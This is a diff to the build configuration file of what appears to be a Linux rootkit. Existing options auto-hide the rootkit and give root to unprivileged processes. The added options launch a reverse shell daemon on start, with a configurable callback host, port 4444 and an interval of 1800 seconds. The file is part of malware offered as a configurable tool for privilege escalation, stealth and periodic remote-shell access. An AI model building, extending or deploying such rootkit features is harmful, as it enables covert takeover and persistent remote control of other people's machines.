@@ -66,3 +66,25 @@ config CONFIG_AUTO_HIDE
 config CONFIG_GIVE_ROOT
     bool "Enable give root to a process run by an unprivileged user"
     default y
+
+config CONFIG_RSHELL_ON_START
+    bool "Would you like to launch the reverse shell daemon on start?"
+    default n
+    
+menu "Reverse shell daemon configuration"
+    depends on CONFIG_RSHELL_ON_START
+
+    config LHOST
+        string "Host to receive the reverse shell"
+        default "127.0.0.1"
+        
+    config LPORT
+        string "Port get the reverse shell"
+        default "4444"
+
+    config INTERVAL
+        string "How long is your interval? (in seconds)"
+        default "1800"
+            
+    comment "END"
+endmenu
